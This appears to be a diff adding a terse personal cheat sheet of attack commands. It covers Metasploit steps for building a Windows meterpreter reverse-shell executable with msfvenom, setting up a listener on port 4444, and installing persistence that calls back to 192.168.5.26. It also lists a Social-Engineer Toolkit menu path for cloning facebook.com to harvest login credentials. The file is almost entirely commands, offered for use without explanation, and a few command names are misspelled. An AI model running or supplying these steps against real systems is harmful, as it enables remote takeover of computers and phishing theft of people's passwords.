@@ -1,0 +1,34 @@
+service postgresql start
+msfexploit
+
+session -i 1
+sysinfo
+screenshot
+ps
+migrate [pid]
+
+run persistence -U i 5 -p 4444 -r 192.168.5.26
+shell
+--
+
+msfvenom -p windows/meterpreter/reverse_tcp lhost= lport= -f exe -o /root/Desktop/1.exe
+
+--
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+set ExitOnSession false
+exploit -j
+
+--
+
+settoolkit
+1) Social-Engineering Attacks
+  2) Website Attack Vectors
+    3) Credential Harvester Attack Method
+	  2) Site Cloner
+		0.0.0.0(LHOST)
+		http://www.facebook.com
+  
